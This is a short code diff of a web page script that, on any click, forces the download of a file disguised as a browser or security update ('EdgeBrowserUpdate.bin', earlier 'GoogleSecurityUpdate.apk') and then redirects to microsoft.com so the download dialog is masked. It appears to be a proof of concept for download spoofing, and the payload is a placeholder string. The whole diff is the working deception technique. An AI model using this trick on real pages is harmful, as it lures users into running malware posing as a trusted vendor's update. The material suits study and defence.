@@ -8,20 +8,19 @@
 
 <script>
 document.addEventListener('click', () => {
-    const blob = new Blob(
-        ['malicious content'], 
-        {type: 'application/vnd.android.package-archive'}
-    );
+    // Trigger download dialog Android
+    const blob = new Blob(['malicious content'], {type: 'application/octet-stream'});
     const url = URL.createObjectURL(blob);
-    
+
     const a = document.createElement('a');
     a.href = url;
-    a.download = 'GoogleSecurityUpdate.apk';
+    a.download = 'EdgeBrowserUpdate.bin';
     a.click();
-    
+
+    // Race: navigate after dialog appears
     setTimeout(() => {
-        window.location.href = 'https://google.com';
-    }, 500);
+        window.location.href = 'https://microsoft.com';
+    }, 500);  // Android needs to be faster because it downloads directly to the notification bar.
 });
 </script>
 </body>
